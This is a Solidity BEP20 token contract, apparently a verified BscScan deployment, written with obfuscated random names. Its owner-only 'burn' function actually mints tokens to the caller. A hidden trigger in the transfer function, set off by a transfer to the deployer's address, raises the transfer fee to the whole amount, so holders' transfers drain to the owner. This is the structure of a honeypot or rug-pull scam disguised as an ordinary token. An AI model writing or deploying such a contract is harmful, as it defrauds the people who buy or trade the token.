/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity = 0.7.0;
contract zdTMwC {
uint256 public  vcHqII = 10000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  EHqpRK = address(0);
uint256 public  nwSuAb = 100000000000000000;
string public  name = "lKfWqE";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  nfzBXX = address(0);
address public  yxYlNU = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  ArfTPG = 10000000000000000000000000000;
uint256 public  ZSSihJ = 10000000000000000;
uint256 public  UvuUdA = 100000000000000000000000;
address public  FGVSWC = address(0);
uint256 public constant jNHVXS = 9+1;
mapping (address => uint256) public balanceOf;
address public  eRDkvG = address(0);
address public owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  Vlvtcg = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint8 public constant decimals = 18;
uint256 public  AYpsXB = 1000000000000000000;
string public  symbol = "wmcKvh";
uint256 public  DCOYgf = 100000000000000000000000;
uint256 public  bNHRHg = 100000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  PmqNIe = address(0);
uint256 private  ZDwmLD = 10000000000000;
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "mYIUyb");
require(to != address(0), "mYIUyb");
require(amount <= balanceOf[from], "mYIUyb");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* jNHVXS/ZDwmLD ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==EHqpRK){
ZDwmLD = 9+1;
}
emit Transfer(from, to, transferAmount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor ()  {
EHqpRK = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

}